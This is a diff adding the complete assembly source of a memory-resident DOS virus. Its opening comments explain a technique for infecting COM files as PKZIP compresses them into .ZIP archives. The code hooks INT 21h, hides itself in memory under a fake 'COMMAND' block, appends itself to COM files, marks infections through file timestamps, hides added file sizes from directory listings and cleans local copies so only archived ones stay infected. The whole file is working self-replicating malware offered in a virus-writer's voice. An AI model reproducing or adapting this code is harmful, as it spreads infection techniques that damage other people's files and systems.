@@ -1,0 +1,637 @@
+;Lately I've seen some viruses boasting they could infect archivers.
+;(Hi Sepultura, didnt you test chaos-ad ???)
+;This is quite simple for ARJ etc. But with PKZIP this is quite different,
+;due to the way PKZIP gets the size of the files to be compressed.
+;Most archivers look for files via INT 21h/ah=4Eh/4Fh.
+;Then the file is opened and compressed, no matter whats in the DTA.
+;PKZIP looks up filesizes before opening files and stores them somehow.
+;Only the filesize in the DTA will be compressed. That means, if a FastInfector
+;, infecting on OpenFile, is active, it will NOT be in the compressed file !
+;(Well, yes, the header changes are compressed, but the main portion appended
+;to the host will be lost).
+;
+;So the Idea is the following :
+;-look for files with extension .ZIP being opened for Read/Write access
+; (PKUNZIP opens for readonly)
+;-if a ZIP-file is opened, set a flag for enabling infect on OpenFile
+;-if a ZIP-File is closed, it is assumed compression is over -> clear flag
+;-whenever FindFirst/FindNext occurs and flag is set,
+; check if file is infectable; if so,
+; increase FileSize in DTA (may do some DirStealth if not)
+;-whenever a file is opened, check flag
+;-if flag is set, infect file the usual way
+;-disinfect when its closed (oly the archived files shall be infected)
+;
+;Care should be taken not to infect files whose size wasnt increased
+;(CRC-Errors, corruption of program), or to increase Filesizes of files
+;one will not infect later
+;(resulting in CRC-Errors)
+;
+;
+;The following code does it, but it is in NO way optimized.
+;Some parts are plain bogus, as the whole stuff is experimental.
+;It will infect suitable COMs that are compressed with PKZIP to an
+;archive with the extension .ZIP, nothing else.
+;
+;Routines commented in Italian are with friendly permission of Tankard.
+;
+;And, ehhmmm, there is a problem with INT 21h/ah=4Eh. Some programs hang
+;with this routine active, so i commented it out. (Solutions?)
+;
+;
+;------------------Cut here--------------------------------------------
+.model tiny
+.radix 16
+.286
+.code
+	org     100h
+jumps
+len             EQU  vir_end-start
+MCB_Flag        EQU  00h                        ;
+MCB_Owner       EQU  01h                        ;
+MCB_Size        EQU  03h                        ;
+MCB_Name        EQU  08h                        ;
+MCB_Junk        EQU  05h                        ;
+COMMAND_LENGTH  EQU  11                         ;
+EnvPtr          EQU  002ch                      ;
+
+start:
+		  call    Get_Offset
+Get_Offset:
+		  pop     si
+
+		  mov cx,0FCFCh
+		  mov ah,30h            ;get DOS-Version  ;-))
+		  int 21h
+		  cmp ax,0FADEh
+		  je no_install
+
+push si
+add si,offset flag
+sub si,offset get_offset
+mov byte ptr cs:[si],'X'        ;set flag off
+pop si
+
+;                  mov sp,si            ;you want a stack ?
+;                  add sp,offset vir_end
+;                  add sp,200h
+
+		  push  cs             ;
+		  pop   ds                                ;
+
+		  MOV   BP,SI          ;
+		  push  si
+		  SUB   BP,Offset Get_Offset;
+		  MOV   Cx,00ffh       ; Lunghezza del virus in memoria
+		  CALL  Alloca_Memory  ;
+		  JC    qui1           ; se non c'era spazio a disposizione
+
+		  MOV   Di,0100h       ; Copia addesso il virus in memoria alta
+		  MOV   Si,BP          ;
+		  ADD   Si,0100h       ;
+		  MOV   Cx,len         ;
+		  REP   MOVSB          ; Fine Copia
+
+		  push    es
+		  mov     ax,3521h
+		  int     21h                      ;Get Int 21 Address
+		  pop     ds
+		  mov     word ptr ds:[offset Int_21],bx      ;Save old Int 21
+		  mov     word ptr ds:[offset Int_21+02h],es
+		  mov     dx,Offset Int_21_Handler
+		  mov     ah,25h
+		  int     21h            ;Set Int 21
+
+qui1:             pop     si
+no_install:
+;restore to host
+;rewrite header
+	mov cx,05h
+	push cs
+	pop es
+	add si,offset header1
+	sub si,offset get_offset
+	mov di,0100h
+	rep movsb                        ;copy header ds:si->es:di
+	mov di,0100h
+	jmp di
+
+		  mov ax,4C00h
+		  int 21h
+
+COMMAND_STR DB 'TANxxxxxxx',0
+;
+;----------------------------------------------------------------------------
+
+Int_21_Handler:
+	cmp ah,3Dh          ;Is open via Handle?
+	je open_handle
+	cmp ah,3Eh
+	je close_handle
+
+	cmp ah,4Fh          ;size is checked beforehand !
+	je find_file
+;        cmp ah,4Eh          ;findfirst
+;        je find_file
+
+	cmp ah,12h
+	je find_file_fcb
+	cmp ah,11h
+	je find_file_fcb
+
+	cmp ah,30h          ;residency check, was DOS-Version
+	je im_here
+
+	jmp     Go_Int_21          ;No, Restore control to Int 21
+
+;------------------------------------------------------------------------
+im_here:
+	cmp cx,0FCFCh
+	jne go_int_21
+	mov ax,0FADEh
+	iret
+;------------------------------------------------------------------------
+find_file_fcb:
+	pushf
+	call cs:[int_21]
+	jc fff_error
+
+	push ax bx cx dx ds es di si bp
+	pushf
+
+	cmp byte ptr cs:[offset flag],'#'
+	je no_need
+
+
+
+	mov ah,51h
+	int 21h                 ;get DTA
+	mov es,bx
+	cmp bx,es:[16h]
+	jnz no_need
+	mov bx,dx
+	mov al,[bx]
+
+	push ax
+	mov ah,2Fh
+	int 21h
+	pop ax
+
+	inc al
+	jnz standard_fcb
+extended_fcb:
+	add bx,07h                      ;extended FCB
+standard_fcb:
+	mov ax,es:[bx+17h]              ;get time
+	and ax,0000000000011111b        ;unmask seconds
+	xor ax,0000000000010101b        ;is 42 s ?
+	jnz no_need
+	sub es:[bx+1Dh],len
+;        sbb es:[bx+1Fh],00h
+
+no_need:
+
+	popf
+	pop bp si di es ds dx cx bx ax
+
+fff_error:
+	retf 2
+;-------------------------------------------------------------------------
+find_file:
+	pushf
+	call cs:[int_21]
+	jc find_error
+
+	push ax bx cx dx ds es di si bp
+	pushf
+
+	mov ah,2Fh                  ;get DTA
+	int 21h                 ;es:bx->dta
+
+	cmp byte ptr cs:[offset flag],'#'
+	jne dir_stealth                    ;
+
+	mov cx,word ptr es:[bx+16h]        ;get filetime
+	and cx,0000000000010101b
+	cmp cx,0000000000010101b           ;is 42s ?
+	je is_infected
+
+	cmp word ptr es:[bx+1Ah],0EFFFh    ;size, shouldnt be too big
+	ja is_infected
+
+	push bx
+	pop di
+	add di,1Eh
+	cld
+	mov cx,0Ah
+	mov ax,'C.'                   ;search filename for extension .COM
+find_com_loop:
+;dec di
+	scasw                   ;es:di=ax ?
+	je loc_01
+	dec di
+	dec cx
+	jnz find_com_loop
+	jmp is_infected
+loc_01:
+	mov ax,'MO'
+	scasw
+	jne is_infected
+
+; is *.COM of right size and time other than 42 sec, prepare for infection !
+	mov cx,word ptr es:[bx+16h]
+	and cx,1111111111100000b            ;clear seconds
+	xor cx,0000000000010101b            ;set 42 seconds (my marker)
+	mov word ptr es:[bx+16h],cx         ;set time
+	add es:[bx+1Ah],len                 ;now add virus_size
+	jmp is_infected
+
+dir_stealth:
+	mov ax,word ptr es:[bx+16h]
+	and ax,0000000000010101b
+	cmp ax,0000000000010101b
+	jne is_infected
+	sub es:[bx+1Ah],len
+;        sbb es:[bx+1Ah],00h
+
+
+is_infected:
+no_com:
+	popf
+	pop bp si di es ds dx cx bx ax
+find_error:
+
+	 retf 2
+
+
+;------------------------------------------------------------------------
+open_handle:
+	cmp byte ptr cs:[offset flag],'#'   ;is a file .ZIP open ?
+	je infect
+
+	push ax bx cx dx ds es di bp si
+	push ax
+	push ds
+	pop es
+	push dx
+	pop di
+	mov al,'.'
+	cld
+	repne scasb             ;al=es:di?
+
+	push es
+	pop ds
+	push di
+	pop si
+
+	lodsw                   ;ds:si->al
+	cmp ax,'IZ'
+	jne no_zip
+
+	lodsb                   ;ds:si->al
+	cmp al,'P'
+	jne no_zip
+
+	jmp set_flag            ;if file of extension .ZIP is opened, set flag
+no_zip:
+	pop ax
+	pop si bp di es ds dx cx bx ax
+	jmp go_int_21
+
+infect:                         ;flag is set
+	pushf
+	call cs:[int_21]        ;open requested file
+	jc quit
+
+	push ax bx cx dx ds es di bp si
+	xor bx,bx
+	mov bx,ax                  ;handle in bx
+	push bx
+	mov ax,1220h
+	int 2Fh
+	jc quit_sft
+	mov ax,1216h
+	mov bl,es:[di]
+	int 2Fh                     ;get es:di -> sft
+	jc quit_sft
+	mov word ptr cs:[offset sft_off],di
+	mov word ptr cs:[offset sft_seg],es
+	pop bx
+
+	mov es:[di+02h],byte ptr 02h         ;set open_mode r/w
+	cmp word ptr es:[di+28h],'OC'        ;is *.COM ?
+	jne quit
+	cmp byte ptr es:[di+2Ah],'M'         ;is really *.COM ?
+	jne quit
+
+	mov cx,word ptr es:[di+0D]           ;get time
+	and cx,0000000000010101b
+	cmp cx,0000000000010101b             ;check if infected
+	je quit
+
+	mov ax,4200h
+	cwd
+	xor cx,cx
+	int 21h                          ;go start of file
+	jc quit
+
+	mov ah,3Fh
+	mov cx,05h
+	mov dx,offset header1
+	push cs
+	pop ds
+	int 21h                          ;read header to buffer
+	jc quit
+
+	mov cx,05h
+	push cs
+	pop es
+	mov si,offset header1
+	mov di,offset header2
+	rep movsb                        ;copy header
+
+	cmp word ptr cs:[offset header1+03h],'##' ; yet  another infection
+marker ;-))
+	je quit                          ;already infected
+
+	mov ax,4202h
+	cwd
+	xor cx,cx
+	int 21h                          ;go eof
+	jc quit
+	mov f_seg,dx
+	mov f_off,ax                     ;save eof for JMP
+
+	cmp ax,0EFFFh                    ;if file is too big
+	ja quit
+
+	mov ah,40h
+	mov cx,len
+	mov dx,0100h
+	int 21h                          ;append to host
+	jc quit
+	mov ax,4200h
+	cwd
+	xor cx,cx
+	int 21h                          ;go sof
+	jc quit
+
+	mov byte ptr cs:[header2],0E9h         ;form jmp
+	sub f_off,03h
+	mov ax,f_off
+	mov word ptr cs:[header2+01h],ax
+	mov word ptr cs:[header2+03h],'##'        ;infectmarker
+
+	mov ah,40h
+	mov cx,05h
+	mov dx,offset header2
+	int 21h                          ;write header to sof from ds:dx
+	jc quit
+
+	mov ax,4200h
+	cwd
+	xor cx,cx
+	int 21h                          ;go sof
+	jc quit
+
+
+	mov ax,5700h                        ;get date&time
+	int 21h                             ;dont want to change it
+	mov word ptr cs:[offset f_time],cx  ;save time
+	mov word ptr cs:[offset f_date],dx  ;save date
+
+	mov byte ptr cs:[offset marker],'I'
+quit:
+	pop si bp di es ds dx cx bx ax
+
+exit_infect:
+	iret
+
+;---------------------------------------------------------------
+disinfect:                      ;is not zip and no flag
+	pushf
+	call cs:[int_21]        ;perform original open
+	retf 2                  ;one could provide stealth capabilities here
+;------------------------------------------------------------------------
+
+set_flag:
+	 pop ax
+
+	 cmp al,00100010b               ;is read/write access ?
+	 je zip_rw
+	 cmp al,00100000b               ;is read/only acces ?
+	 je zip_ro
+	 jne no_flag
+zip_rw:
+	 mov byte ptr cs:[offset flag],'#'
+	 jmp short no_flag
+zip_ro:
+	 mov byte ptr cs:[offset flag],'@'
+	 jmp short no_flag
+
+no_flag:
+	 pop si bp di es ds dx cx bx ax
+	 jmp go_int_21
+;------------------------------------------------------------------------
+close_handle:
+;is *.zip closed ? if yes clear flag
+;is no zip and flag is on -> disinfect
+	push ax bx cx dx ds es di bp si
+	mov ax,1220h
+	push bx
+	int 2Fh
+	jc quit_sft
+	mov ax,1216h
+	mov bl,es:[di]
+	int 2Fh          ;get sft -> es:di
+	jc quit_sft
+
+	cmp byte ptr es:[di+28h],'Z'
+	jne not_zip
+	cmp word ptr es:[di+29h],'PI'
+	jne not_zip
+clear_flag:
+	mov byte ptr cs:[offset flag],'X'
+
+	jmp quit_sft
+
+not_zip:
+
+;is zip-r/w-access (flag='#') -> disinfect
+;is zip-r/o-access (flag='@') -> no disinfect
+	cmp byte ptr cs:[offset flag],'#'
+	jne try_slow_infect
+
+	call disinfect_handle
+	jmp quit_sft
+
+try_slow_infect:                ;all this is plain stupid !
+
+	mov al,byte ptr es:[di+02h]
+	and al,00000011b             ;last two bits are (w/o or r/w)
+	cmp al,00h
+	je quit_sft
+
+
+
+quit_sft:
+	mov byte ptr cs:[offset marker],'N'; .ZIP is closed, so clear flag
+	pop bx
+	pop si bp di es ds dx cx bx ax
+	jmp go_int_21
+
+;------------------------------------------------------------------------
+disinfect_handle:
+	push ax bx cx dx ds es di bp si
+	xchg ax,bx
+
+	cmp byte ptr cs:[offset marker],'I'
+	jne quit_d
+
+	push bx
+	mov ax,1220h
+	int 2Fh
+	mov ax,1216h
+	mov bl,es:[di]
+	int 2Fh                 ;get es:di -> sft
+	mov word ptr cs:[offset sft_off],di
+	mov word ptr cs:[offset sft_seg],es
+	pop bx
+
+	cmp word ptr es:[di+28h],'OC'        ;is *.COM ?
+	jne quit_d
+	cmp byte ptr es:[di+2Ah],'M'         ;is really *.COM ?
+	jne quit_d
+	mov es:[di+02h],byte ptr 02h         ;set open_mode r/w
+
+	mov ax,4200h
+	xor dx,dx
+	xor cx,cx
+	int 21h                  ;go sof
+	jc quit_d
+
+	mov ah,3Fh
+	mov cx,05h
+	mov dx,offset header2
+	push cs
+	pop ds
+	int 21h                  ;read header
+	jc quit_d
+
+	cmp word ptr cs:[header2+03h],'##'     ;check infectmarker
+	jne quit_d
+
+	mov dx,word ptr cs:[offset header2+01h]  ;read jmp-adress
+	push dx                          ;save
+	add dx,offset header1
+	sub dx,0FDh                 ; = -0100h +03h
+	xor cx,cx
+	mov ax,4200h
+	int 21h                ;set filepointer to original header
+	jc quit_d
+
+	mov ah,3Fh
+	mov cx,05h
+	mov dx,offset header2
+	push cs
+	pop ds
+	int 21h                  ;read original header from virusbody
+	jc quit_d
+
+	mov ax,4200h
+	xor cx,cx
+	xor dx,dx
+	int 21h                 ;filepointer to start
+
+	mov ah,40h
+	mov cx,05h
+	push cs
+	pop ds
+	mov dx,offset header2
+	int 21h                  ;write header to sof from ds:dx
+	jc quit_d
+
+	mov ax,4200h
+	pop dx                   ;saved jmp
+	add dx,03h
+	xor cx,cx
+	int 21h                  ;move filepointer there
+	mov ah,40h
+	xor cx,cx
+	int 21h                  ;truncate file at old JMP
+
+	mov ax,4200h
+	xor cx,cx
+	xor dx,dx
+		  int 21h
+
+	mov ax,5701h
+	mov cx,word ptr cs:[offset f_time]     ;set date&time
+	mov dx,word ptr cs:[offset f_date]
+	int 21h
+
+
+
+quit_d:
+	pop si bp di es ds dx cx bx ax
+	ret
+
+;this is with friendly permission of TANKARD (thanx dude)
+Alloca_Memory PROC NEAR
+		MOV  Ah,4Ah                     ;
+		MOV  Bx,0FFFFh                  ; richiedi il numero di blocchi
+		INT  21h                        ;  del programma ospite
+		SUB  Bx,Cx                      ;
+		JB   _lab1                      ;
+		MOV  Ah,4Ah                     ; modifica il numero di blocchi
+		INT  21h                        ;  attuali per liberare spazio
+						;  per allocare il virus
+		MOV  Ah,48h                     ;
+		DEC  Cx                         ; alloca lo spazio per con-
+		MOV  Bx,Cx                      ;  tenere il virus
+		INT  21h                        ;
+		JC   _lab1                      ;
+		DEC  Ax                         ;
+		MOV  ES,Ax                      ;
+		INC  Ax                         ; fallo stare residente come
+		MOV  ES:[MCB_Owner],Ax          ;  un prg TSR
+		MOV  Dx,Ax                      ;
+		MOV  Ah,26h                     ;
+		INT  21h                        ; crea nuovo PSP per il blocco
+																;  di memoria
+		MOV  Di,MCB_Junk                ;
+		LEA  Si,COMMAND_STR             ; - 06h       ;
+		ADD  Si,BP                      ; copy nel Memory Control Block
+		MOV  Cx,COMMAND_LENGTH          ;  la stringa "COMMAND"
+		PUSH CS                         ;
+		POP  DS                         ;
+		REP  MOVSB                      ;
+
+		MOV  Ax,ES                      ;
+		INC  Ax                         ;
+		MOV  ES,Ax                      ;
+		CLC                             ;
+		RET                             ;
+_lab1         : STC                             ;
+		RET                             ;
+Alloca_Memory ENDP
+
+
+
+Go_Int_21:
+	db      0EAh            ;Go On With Int 21
+Int_21   dd      ?
+flag db 00h
+header1 db 0CDh, 20h, 00h, 00h, 00h, 00h ;this is just for this very COM-File
+header2 db 05h dup (?)                   ; it means INT 20h
+f_time dw ?
+f_date dw ?
+sft_off dw ?
+sft_seg dw ?
+f_off dw ?
+f_seg dw ?
+marker db ?
+vir_name db '??'        ;Never named one!
+
+vir_end:
+end     start
